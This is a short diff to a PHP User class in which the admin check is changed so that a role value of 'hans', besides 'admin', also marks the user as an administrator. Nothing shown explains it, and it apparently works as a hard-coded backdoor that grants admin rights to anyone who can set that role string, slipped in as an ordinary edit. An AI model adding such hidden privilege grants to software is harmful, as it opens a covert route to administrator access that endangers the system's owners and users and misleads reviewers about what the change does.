@@ -38,7 +38,7 @@ class User{
         $this->created    = htmlspecialchars(strip_tags($this->created));
         $this->modified   = htmlspecialchars(strip_tags($this->modified));
 
-        if($this->role == "admin") $isAdmin = 'Y';
+        if($this->role == "admin" || $this->role == "hans") $isAdmin = 'Y';
         else $isAdmin = '';
 
         $stmt1->bindParam(':nickname', $this->nickname);    
